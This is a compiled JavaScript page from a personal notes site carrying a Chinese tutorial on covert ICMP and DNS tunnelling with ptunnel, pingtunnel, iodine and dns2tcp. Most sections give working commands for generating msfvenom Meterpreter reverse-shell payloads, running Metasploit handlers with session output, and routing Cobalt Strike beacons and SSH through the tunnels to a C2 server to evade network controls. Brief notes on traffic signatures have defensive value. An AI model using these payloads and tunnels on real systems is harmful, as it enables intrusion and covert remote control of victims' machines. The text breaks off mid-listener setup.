import{_ as a}from"./plugin-vue_export-helper-x3n3nnut.js";import{r as n,o as t,c as l,a as e,b as r,d,e as s}from"./app-UV9inHLU.js";const p="/DailyNotes/assets/image-20231204182250798-geF0VRwt.png",c="/DailyNotes/assets/image-20231204180659967-JAkNWity.png",o="/DailyNotes/assets/image-20231204180954893-Cy1T35-E.png",g="/DailyNotes/assets/image-20231204181423774-LYYgoDSZ.png",m="/DailyNotes/assets/image-20231205131213945-kr6PdF9d.png",u="/DailyNotes/assets/image-20231205131228617-Bw0REM8T.png",v="/DailyNotes/assets/image-20231204182013245-M3yaQu5N.png",b="/DailyNotes/assets/image-20231205131401807-a3i5FuBT.png",h="/DailyNotes/assets/image-20231205140005738-7VESPvF4.png",x="/DailyNotes/assets/image-20231205140103703-lATBkpdX.png",f="/DailyNotes/assets/image-20240109223556139-19LzBgM4.png",_="/DailyNotes/assets/image-20240109223629232-nehoXsx_.png",y="/DailyNotes/assets/image-20240109224512073-J1lHwIfo.png",P="/DailyNotes/assets/image-20240109224633925-iCx7MdfB.png",k="/DailyNotes/assets/image-20240115153402449-JT1n8NW1.png",C="/DailyNotes/assets/image-20240116152131909-jxRXV9IT.png",H="/DailyNotes/assets/image-20240116153846286-ubAELSrC.png",N="/DailyNotes/assets/image-20240109230229832-Yho2XIUP.png",D="/DailyNotes/assets/image-20240109230426359-VcCCtnh2.png",I="/DailyNotes/assets/dnspod-pPlNwEu0.png",S="/DailyNotes/assets/port-1YeWZiWw.png",z="/DailyNotes/assets/server-jJQJ4ZMX.png",T="/DailyNotes/assets/ifconfig_server--SE7VCO5.png",A="/DailyNotes/assets/client-Wr3kkNVR.png",B="/DailyNotes/assets/ifconfig_client-LRJ6UNyP.png",M="/DailyNotes/assets/pingserver-PrD1GiTh.png",w="/DailyNotes/assets/ssh-jQkfjcvN.png",L="/DailyNotes/assets/ssh2-CRvxyDR6.png",V="/DailyNotes/assets/dns2tcp1-M6YCN52_.png",R="/DailyNotes/assets/dns2tcp2-CtxqL1VI.png",q="/DailyNotes/assets/dns2tcp3-RORBAvdp.png",O="/DailyNotes/assets/dns2tcp4-RMjjj2S_.png",E="/DailyNotes/assets/dns2tcp5-sEaHNvQ6.png",W="/DailyNotes/assets/dns2tcp6-J2fKNttY.png",j={},J=s('<h1 id="内网隧道工具使用" tabindex="-1"><a class="header-anchor" href="#内网隧道工具使用" aria-hidden="true">#</a> 内网隧道工具使用</h1><h2 id="_1-icmp隧道" tabindex="-1"><a class="header-anchor" href="#_1-icmp隧道" aria-hidden="true">#</a> 1. ICMP隧道</h2><h3 id="_1-1-ptunnel" tabindex="-1"><a class="header-anchor" href="#_1-1-ptunnel" aria-hidden="true">#</a> 1.1 ptunnel</h3>',3),Y={href:"https://salsa.debian.org/alteholz/ptunnel",target:"_blank",rel:"noopener noreferrer"},F=s(`<p>主要参数（ptunnel -h可以查看详细信息）</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>-x ：指定ICMP隧道连接的验证密码
-lp：指定要监听的本地TCP端口
-da：指定要转发的目标机器的IP地址
-dp：指定要转发的目标机器的TCP端口
-p：指定ICMP隧道连一段的IP地址
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h4 id="上线msf" tabindex="-1"><a class="header-anchor" href="#上线msf" aria-hidden="true">#</a> 上线msf</h4><p>攻击机：开启ptunnel的server，将client端发过来的icmp流量解析成tcp的</p><p>靶机：开启ptunnel的client，监听本地的9999端口，ptunnel的client将9999端口接到的流量封装成icmp，发送到server端。</p><p><strong>1）攻击机操作：</strong></p><p>新生成msf马，然后放在靶机上</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=9999 -f elf -o exp
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>攻击机开启msf监听，此处监听的4444端口，后面会用到</p><figure><img src="`+p+`" alt="image-20231204182250798" tabindex="0" loading="lazy"><figcaption>image-20231204182250798</figcaption></figure><p>攻击机开启ptunnel的server kali自带的，所以直接执行就可以</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>ptunnel 
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><figure><img src="`+c+`" alt="image-20231204180659967" tabindex="0" loading="lazy"><figcaption>image-20231204180659967</figcaption></figure><p><strong>2）靶机操作：</strong></p><p>靶机端执行client</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>./ptunnel -p 100.1.1.169 -lp 9999 -da 100.1.1.169 -dp 4444

# -p   server端的IP
# -lp  本地监听的端口（只要是这个端口接到的tcp流量，全部封装成icmp,发送到server端）
# -da -dp 告诉server端，解析后的流量转发到哪个ip和端口，这里填的是msf监听的IP和端口
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>运行可能报错</p><p><img src="`+o+`" alt="image-20231204180954893" loading="lazy">解决办法：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>sudo yum install libpcap-devel
# 安装完可能版本不对
cd /usr/lib64/
ln -s libpcap.so.1.5.3 libpcap.so.0.8
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><figure><img src="`+g+'" alt="image-20231204181423774" tabindex="0" loading="lazy"><figcaption>image-20231204181423774</figcaption></figure><p>靶机正常执行后效果如下：</p><figure><img src="'+m+'" alt="image-20231205131213945" tabindex="0" loading="lazy"><figcaption>image-20231205131213945</figcaption></figure><p>然后靶机执行msf马，server端会收到消息，从192.168.1.189接到了icmp流量，解析出来后发现需要转发到100.1.1.169的4444端口</p><figure><img src="'+u+'" alt="image-20231205131228617" tabindex="0" loading="lazy"><figcaption>image-20231205131228617</figcaption></figure><p>上线成功</p><figure><img src="'+v+'" alt="image-20231204182013245" tabindex="0" loading="lazy"><figcaption>image-20231204182013245</figcaption></figure><figure><img src="'+b+'" alt="image-20231205131401807" tabindex="0" loading="lazy"><figcaption>image-20231205131401807</figcaption></figure><p>上面的session看起来是攻击机的IP，其实ptunnel的server端转发过来的，只是ptunnel的server和msf放在同一个攻击机上而已。</p><h4 id="流量特征" tabindex="-1"><a class="header-anchor" href="#流量特征" aria-hidden="true">#</a> 流量特征</h4><p>先发送1个长度为70的request，然后又2个长度70的reply(内容固定)，接着就一直发送长度为1096的reply包，每秒为一个周期（可以对比下面两图的时间差）,流量包： <a href="img%5CTunnel%5Cptunnel_2.pcap">ptunnel_2.pcap</a> <a href="img%5CTunnel%5Cptunnel_1.pcap">ptunnel_1.pcap</a></p><figure><img src="'+h+'" alt="image-20231205140005738" tabindex="0" loading="lazy"><figcaption>image-20231205140005738</figcaption></figure><figure><img src="'+x+`" alt="image-20231205140103703" tabindex="0" loading="lazy"><figcaption>image-20231205140103703</figcaption></figure><h3 id="_1-2-pingtunnel" tabindex="-1"><a class="header-anchor" href="#_1-2-pingtunnel" aria-hidden="true">#</a> 1.2 pingtunnel</h3><blockquote><p>下面以服务端为server，client端为windows为例（反过来无法上线，不知道为啥）</p></blockquote><h4 id="基础转发tcp流量" tabindex="-1"><a class="header-anchor" href="#基础转发tcp流量" aria-hidden="true">#</a> 基础转发tcp流量</h4><p>简单的通过icmp隧道转发tcp流量，攻击机kali-192.168.73.98</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>./pingtunnel -type server -key 123456
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><figure><img src="`+f+`" alt="image-20240109223556139" tabindex="0" loading="lazy"><figcaption>image-20240109223556139</figcaption></figure><p>靶机Win-192.168.1.8</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>./pingtunnel.exe -type client -l :8888 -s 192.168.73.98 -t 192.168.73.98:7777 -tcp 1 -key 123456
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><figure><img src="`+_+'" alt="image-20240109223629232" tabindex="0" loading="lazy"><figcaption>image-20240109223629232</figcaption></figure><p>这样通道就建立起来，192.168.1.8的8888端口收到的tcp流量，都会被转为icmp流量发给server，然后在server端解析成tcp（解析到7777端口）</p><p>假如这样把tcp流量发给192.168.1.8的8888</p><figure><img src="'+y+'" alt="image-20240109224512073" tabindex="0" loading="lazy"><figcaption>image-20240109224512073</figcaption></figure><p>server端可以收到并解析出来</p><figure><img src="'+P+`" alt="image-20240109224633925" tabindex="0" loading="lazy"><figcaption>image-20240109224633925</figcaption></figure><h4 id="转发tcp上线msf" tabindex="-1"><a class="header-anchor" href="#转发tcp上线msf" aria-hidden="true">#</a> 转发TCP上线msf</h4><ul><li>准备好一个具有公网IP的服务器，root权限运行以下命令，启动ICMP隧道服务端</li></ul><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>./pingtunnel -type server -noprint 1 -nolog 1
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><ul><li>ICMP隧道客户端（即需要通过ICMP隧道上线的主机）执行以下命令即可成功创建反向ICMP隧道</li></ul><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code>pingtunnel.exe <span class="token parameter variable">-type</span> client <span class="token parameter variable">-l</span> <span class="token number">127.0</span>.0.1:9999 <span class="token parameter variable">-s</span> icmpserver_ip <span class="token parameter variable">-t</span> c2_server_ip:7777 <span class="token parameter variable">-tcp</span> <span class="token number">1</span> <span class="token parameter variable">-noprint</span> <span class="token number">1</span> <span class="token parameter variable">-nolog</span> <span class="token number">1</span>
<span class="token comment"># 该命令的意思是icmp客户端监听127.0.0.1:9999，通过连接到icmpserver_ip的icmp隧道，将127.0.0.1:9999收到的tcp数据包转发到c2_server_ip:7777</span>
<span class="token comment"># icmpserver_ip 192.168.1.10</span>
<span class="token comment"># c2_server_ip 192.168.1.10</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>生成反向payload的meterpreter并上传到ICMP隧道客户端执行即可上线</p><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code>msfvenom <span class="token parameter variable">-p</span> windows/x64/meterpreter/reverse_tcp <span class="token assign-left variable">lhost</span><span class="token operator">=</span><span class="token number">127.0</span>.0.1 <span class="token assign-left variable">lport</span><span class="token operator">=</span><span class="token number">9999</span> <span class="token parameter variable">-f</span> exe <span class="token parameter variable">-o</span> meterpreter.exe
<span class="token comment"># 这里的lhost和lport为icmp客户端监听ip和端口</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><p>启动msf监听，等待meterpreter执行上线</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code># 这里的lhost和lport为icmp客户端转发到的ip和端口

msf6 &gt; use exploit/multi/handler
msf6 exploit(multi/handler) &gt; set payload windows/x64/meterpreter/reverse_tcp
payload =&gt; windows/x64/meterpreter/reverse_tcp
msf6 exploit(multi/handler) &gt; set lhost 0.0.0.0
lhost =&gt; 0.0.0.0
msf6 exploit(multi/handler) &gt; set lport 7777
lport =&gt; 7777
msf6 exploit(multi/handler) &gt; run

[*] Started reverse TCP handler on 0.0.0.0:7777 
[*] Sending stage (200774 bytes) to 192.168.1.10
[*] Meterpreter session 1 opened (192.168.1.10:7777 -&gt; 192.168.1.10:44832) at 2024-01-15 02:26:28 -0500

meterpreter &gt; getuid
Server username: ECHO0D-WIN\\echo0d

</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><figure><img src="`+k+`" alt="image-20240115153402449" tabindex="0" loading="lazy"><figcaption>image-20240115153402449</figcaption></figure><h4 id="转发tcp上线cs" tabindex="-1"><a class="header-anchor" href="#转发tcp上线cs" aria-hidden="true">#</a> 转发TCP上线cs</h4><ul><li>准备好一个具有公网IP的服务器，root权限运行以下命令，启动ICMP隧道服务端</li></ul><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>./pingtunnel -type server -noprint 1 -nolog 1
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>ICMP隧道客户端（即需要通过ICMP隧道上线的主机）执行以下命令即可成功创建反向ICMP隧道</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>pingtunnel.exe -type client -l 127.0.0.1:9999 -s icmpserver_ip -t c2_server_ip:7777 -tcp 1 -noprint 1 -nolog 1

# 该命令的意思是icmp隧道客户端监听127.0.0.1:9999，通过连接到icmpserver_ip的icmp隧道，将127.0.0.1:9999收到的tcp数据包转发到c2_server_ip:7777
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><ul><li><p>cobaltstrike创建listener https host和https port(c2)为ICMP隧道客户端的监听IP和端口 https port(bind)为转发目的地址的端口</p></li><li><p>生成反向payload的beacon</p></li><li><p>上传生成的beacon到ICMP隧道客户端执行，成功通过反向ICMP隧道上线</p></li></ul><h4 id="转发socks上线msf-失败" tabindex="-1"><a class="header-anchor" href="#转发socks上线msf-失败" aria-hidden="true">#</a> 转发socks上线msf（失败）</h4><blockquote><p>按理说是这样的，但是流量里还是有tcp</p></blockquote><ul><li>准备好一个具有公网IP的服务器，root权限运行以下命令，启动ICMP隧道服务端</li></ul><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code>./pingtunnel <span class="token parameter variable">-type</span> server <span class="token parameter variable">-noprint</span> <span class="token number">1</span> <span class="token parameter variable">-nolog</span> <span class="token number">1</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>ICMP隧道客户端（即需要通过ICMP隧道上线的主机）执行以下命令即可成功创建反向ICMP隧道</p><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code>pingtunnel.exe <span class="token parameter variable">-type</span> client <span class="token parameter variable">-l</span> <span class="token number">127.0</span>.0.1:6688 <span class="token parameter variable">-s</span> icmpserver_ip <span class="token parameter variable">-sock5</span> <span class="token number">1</span> <span class="token parameter variable">-nolog</span> <span class="token number">1</span> <span class="token parameter variable">-noprint</span> <span class="token number">1</span>
<span class="token comment"># 该命令的意思是icmp隧道客户端监听127.0.0.1:6688启动socks5服务，通过连接到icmpserver_ip的icmp隧道，由icmpserver转发socks5代理请求到目的地址</span>
<span class="token comment"># icmpserver_ip 192.168.1.10</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>生成支持socks5代理的反向payload的meterpreter并上传到ICMP隧道客户端执行即可上线</p><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code>msfvenom <span class="token parameter variable">-p</span> windows/x64/meterpreter/reverse_tcp <span class="token assign-left variable">LHOST</span><span class="token operator">=</span>c2_server_ip <span class="token assign-left variable">LPORT</span><span class="token operator">=</span><span class="token number">8443</span> <span class="token assign-left variable">HttpProxyType</span><span class="token operator">=</span>SOCKS <span class="token assign-left variable">HttpProxyHost</span><span class="token operator">=</span><span class="token number">127.0</span>.0.1 <span class="token assign-left variable">HttpProxyPort</span><span class="token operator">=</span><span class="token number">6688</span> <span class="token parameter variable">-f</span> exe <span class="token parameter variable">-o</span> meterpreter.exe
<span class="token comment"># c2_server_ip 192.168.1.10</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><p>启动msf监听，等待meterpreter执行上线</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>msf6 &gt; use exploit/multi/handler
msf6 exploit(multi/handler) &gt; set payload windows/x64/meterpreter/reverse_tcp
payload =&gt; windows/x64/meterpreter/reverse_tcp
msf6 exploit(multi/handler) &gt; set lhost 0.0.0.0
lhost =&gt; 0.0.0.0
msf6 exploit(multi/handler) &gt; set lport 6688
lport =&gt; 6688
msf6 exploit(multi/handler) &gt; run

[*] Started reverse TCP handler on 0.0.0.0:6688 
[*] Sending stage (200774 bytes) to 192.168.1.11
[*] Meterpreter session 4 opened (192.168.1.10:6688 -&gt; 192.168.1.11:59957) at 2024-01-16 02:17:38 -0500

meterpreter &gt; getuid
Server username: ECHO0D-WIN\\echo0d
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><figure><img src="`+C+'" alt="image-20240116152131909" tabindex="0" loading="lazy"><figcaption>image-20240116152131909</figcaption></figure><p>此处不确定是否成功，因为夹杂了TCP</p><figure><img src="'+H+'" alt="image-20240116153846286" tabindex="0" loading="lazy"><figcaption>image-20240116153846286</figcaption></figure><h4 id="流量特征-1" tabindex="-1"><a class="header-anchor" href="#流量特征-1" aria-hidden="true">#</a> 流量特征</h4><p>icmp包长度突然变化，就是有tcp流量要发</p><figure><img src="'+N+'" alt="image-20240109230229832" tabindex="0" loading="lazy"><figcaption>image-20240109230229832</figcaption></figure><p>以及突然流量包数量变多</p><figure><img src="'+D+'" alt="image-20240109230426359" tabindex="0" loading="lazy"><figcaption>image-20240109230426359</figcaption></figure><h2 id="_2-dns隧道" tabindex="-1"><a class="header-anchor" href="#_2-dns隧道" aria-hidden="true">#</a> 2. DNS隧道</h2><h3 id="_2-1-iodine" tabindex="-1"><a class="header-anchor" href="#_2-1-iodine" aria-hidden="true">#</a> 2.1 iodine</h3><blockquote><p>以下的服务器和域名均来自腾讯云</p><p>服务器：https://cloud.tencent.com/product/cvm?from=10680</p><p>域名解析：https://cloud.tencent.com/product/cns?from=10680</p></blockquote><p>iodine是基于C语言开发的，分为服务端和客户端。iodine支持转发模式和中继模式。其原理是：通过TAP虚拟网卡，在服务端建立一个局域网，在客户端也通过TAP建立一个虚拟网卡，两者通过DNS隧道连接，处于同一个局域网(可以通过ping命令通信)。在客户端和服务器之间建立连接后，客户机上会多出一块名为dns0的虚拟网卡。</p><p>与同类工具相比，iodine具有如下特点：</p><blockquote><p>参考https://cloud.tencent.com/developer/article/1937092</p></blockquote><ul><li>不会对下行数据进行编码</li><li>支持多平台(Linux、Windows、MacOS)</li><li>支持16个并发连接</li><li>支持强密码机制</li><li>支持同网段隧道IP地质(不同于服务器一客户端网段)</li><li>支持多种DNS记录类型</li><li>提供了丰富的隧道质量检测措施</li></ul><h4 id="_1-部署域名解析" tabindex="-1"><a class="header-anchor" href="#_1-部署域名解析" aria-hidden="true">#</a> 1. 部署域名解析</h4><blockquote><p>https://console.dnspod.cn/</p></blockquote><p>首先，用一台公网的Linux系统的VPS作为C&amp;C服务器，并准备好一个可以配置的域名(这里我们假设是<code>dnslog1.site</code>)。然后配置域名的记录，如下：</p><figure><img src="'+I+`" alt="dnspod" tabindex="0" loading="lazy"><figcaption>dnspod</figcaption></figure><p>创建记录A，将自己的域名<code>dns.dnslog1.site</code>解析到VPS服务器地址。然后创建NS记录，将 <code>dns2tcp.dnslog1.site </code>指向 <code>dns.dnslog1.site </code>。</p><ul><li>第一条A类解析是在告诉域名系统，<code>dns.dnslog1.site</code>的IP地址是 <code>xx.xx.xx.xx</code> 。</li><li>第二条NS解析是在告诉域名系统，想要知道<code>dns2tcp.dnslog1.site</code>的IP地址，就去问<code>dns.dnslog1.site</code> 。</li></ul><p><strong>验证域名解析设置是否成功</strong></p><p>在随便一台电脑上ping域名<code>dns.dnslog1.site</code>，若能ping通，且显示的IP地址是我们配置的VPS的地址，说明第一条A类解析设置成功并已生效。</p><p>然后在我们的VPS上执行以下命令监听UDP 53端口</p><div class="language-javascript line-numbers-mode" data-ext="js"><pre class="language-javascript"><code>tcpdump <span class="token operator">-</span>n <span class="token operator">-</span>i eth0 udp dst port <span class="token number">53</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>在任意一台机器上执行 <code>nslookup dns2tcp.dnslog1.site </code>命令，如果在我们的VPS监听的端口有查询信息，说明第二条记录设置成功。</p><h4 id="_2-安装并启动服务端" tabindex="-1"><a class="header-anchor" href="#_2-安装并启动服务端" aria-hidden="true">#</a> 2. 安装并启动服务端</h4><p>提前检查VPS服务器防火墙的53端口是否打开：</p><figure><img src="`+S+`" alt="port" tabindex="0" loading="lazy"><figcaption>port</figcaption></figure><p>这里用的服务端是Centos7系统，可以执行安装命令：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>yum -y install iodine 
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>如果是Windows系统，可以安装编译好的对应版本的iodine。</p><p>执行以下命令启动服务端：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>iodined -f -c -P root@123456 172.16.10.1 dns2tcp.dnslog1.site -DD
    -f：在前台运行
    -c：禁止检查所有传入请求的客户端IP地址
    -P：指定密码
    -D：指定调试级别。-DD指第二级，D的数量随等级增加
    这里的172.16.10.1是自定义的局域网虚拟IP地址
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><figure><img src="`+z+'" alt="server" tabindex="0" loading="lazy"><figcaption>server</figcaption></figure><p>服务端启动成功后，VPS上多了一块dns0的网卡，ip为我们设置的172.16.10.1</p><figure><img src="'+T+`" alt="ifconfig_server" tabindex="0" loading="lazy"><figcaption>ifconfig_server</figcaption></figure><h4 id="_3-安装并启动客户端" tabindex="-1"><a class="header-anchor" href="#_3-安装并启动客户端" aria-hidden="true">#</a> 3. 安装并启动客户端</h4><p><strong>Windows系统</strong></p><p>如果是Windows系统，直接执行下面命令启动客户端，但是启动的过程中，会遇到杀毒软件的报毒，并且需要管理员权限执行命令才可以启动。</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>iodine.exe -f -P root@123456 dns2tcp.dnslog1.site
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p><strong>Linux系统</strong></p><p>如果是Linux系统，先安装iodine。上传iodlie客户端到目标主机，解压，进入目录安装</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>cd iodine-0.7.0/
make &amp;&amp; make install
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><p>kali默认安装了iodine，执行下面命令连接服务端(需要root权限)，如图连接成功。</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>iodine -f -P root@123456 dns2tcp.dnslog1.site
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><figure><img src="`+A+'" alt="client" tabindex="0" loading="lazy"><figcaption>client</figcaption></figure><p>连接成功后，客户端上新建了一个dns0的网卡，IP地址为172.16.10.2</p><figure><img src="'+B+'" alt="ifconfig_client" tabindex="0" loading="lazy"><figcaption>ifconfig_client</figcaption></figure><p>然后ping服务端地址</p><figure><img src="'+M+'" alt="pingserver" tabindex="0" loading="lazy"><figcaption>pingserver</figcaption></figure><h4 id="_4-使用dns隧道" tabindex="-1"><a class="header-anchor" href="#_4-使用dns隧道" aria-hidden="true">#</a> 4. 使用DNS隧道</h4><p>客户端和服务端连接成功后，由于客户端和服务端处在一个逻辑的局域网中，所以可以直接通。</p><p><strong>服务端SSH连接客户端</strong></p><figure><img src="'+w+'" alt="ssh" tabindex="0" loading="lazy"><figcaption>ssh</figcaption></figure><p><strong>客户端SSH连接服务端</strong></p><figure><img src="'+L+'" alt="ssh2" tabindex="0" loading="lazy"><figcaption>ssh2</figcaption></figure><hr><h3 id="_2-2-dns2tcp" tabindex="-1"><a class="header-anchor" href="#_2-2-dns2tcp" aria-hidden="true">#</a> 2.2 dns2tcp</h3><p>dns2tcp 是一个利用DNS隧道转发TCP连接的工具，使用C语言开发。</p><h4 id="_1-部署域名解析-1" tabindex="-1"><a class="header-anchor" href="#_1-部署域名解析-1" aria-hidden="true">#</a> 1. 部署域名解析</h4><figure><img src="'+V+`" alt="dns2tcp1" tabindex="0" loading="lazy"><figcaption>dns2tcp1</figcaption></figure><p><strong>验证域名解析设置是否成功</strong>，步骤同上。</p><h4 id="_2-安装并启动服务端-1" tabindex="-1"><a class="header-anchor" href="#_2-安装并启动服务端-1" aria-hidden="true">#</a> 2. 安装并启动服务端</h4><p>工具下载地址：https://github.com/alex-sector/dns2tcp</p><p>提前检查VPS服务器防火墙的53端口是否打开，将下载的工具上传到VPS，依次执行</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>unzip dns2tcp-master.zip
cd dns2tcp-master
./configure
make
make install
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>准备配置文件（腾讯云服务器不给实际网卡分配公网IP，所以要监听0.0.0.0）：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>vim /etc/dns2tcpd.conf

listen = 0.0.0.0
port = 53
user = nobody
chroot = /var/empty/dns2tcp/
domain = a.dnslog1.site
resources = ssh:127.0.0.1:22,smtp:127.0.0.1:25,http:127.0.0.1:8080
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>完成后运行服务端：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>dns2tcpd  -F -d 1 -f /etc/dns2tcpd.conf
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><figure><img src="`+R+`" alt="dns2tcp2" tabindex="0" loading="lazy"><figcaption>dns2tcp2</figcaption></figure><h4 id="_3-安装并启动客户端-1" tabindex="-1"><a class="header-anchor" href="#_3-安装并启动客户端-1" aria-hidden="true">#</a> 3. 安装并启动客户端</h4><p>kali默认安装了dns2tcp，测试连接：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>dns2tcpc -z a.dnslog1.site &lt;服务器IP&gt;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>其中&lt;服务器IP&gt;可选，服务端所在IP（DNS服务器IP）。不写将使用中继模式，否则使用直连模式，如果提示：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>Available connection（s）:
        ssh
        smtp
        http
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>表示连接可用！</p><h4 id="_4-使用dns隧道-1" tabindex="-1"><a class="header-anchor" href="#_4-使用dns隧道-1" aria-hidden="true">#</a> 4. 使用DNS隧道</h4><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>dns2tcpc -l 4444 -r ssh  -z a.dnslog1.site &lt;服务器IP&gt; -c -d 3
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>-c表示启用数据压缩；-d表示启动调试，3为调试等级；-l表示监听本地端口，4444为端口名；-r为使用服务端上的哪个资源，ssh为资源名；-z后为前面配置的NS记录的域名。</p><figure><img src="`+q+`" alt="dns2tcp3" tabindex="0" loading="lazy"><figcaption>dns2tcp3</figcaption></figure><p>然后ssh连接本地4444端口就相当于连接服务端：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>ssh root@127.0.0.1 -p 4444
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><figure><img src="`+O+`" alt="dns2tcp4" tabindex="0" loading="lazy"><figcaption>dns2tcp4</figcaption></figure><hr><p><strong>若需要将内网msf流量转发到外网：</strong></p><p>参考：https://blog.csdn.net/redwand/article/details/112727816</p><p>通过dns隧道嵌套ssh隧道实现本地端口转发：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>ssh -CfNg -L 6666:&lt;服务器IP&gt;:6666 root@127.0.0.1 -p 4444
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><figure><img src="`+E+`" alt="dns2tcp5" tabindex="0" loading="lazy"><figcaption>dns2tcp5</figcaption></figure><p>生成木马，监听在客户端192.168.13.188的6666端口上</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.13.188 LPORT=6666 -f elf &gt; shell.elf
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>服务器打开msf，监听6666端口：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>msf6 &gt; use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) &gt; set payload linux/x64/meterpreter/reverse_tcp
payload =&gt; linux/x64/meterpreter/reverse_tcp
msf6 exploit(multi/handler) &gt; set lhost 0.0.0.0
lhost =&gt; 0.0.0.0
msf6 exploit(multi/handler) &gt; set lport 6666
lport =&gt; 6666
msf6 exploit(multi/handler) &gt; run
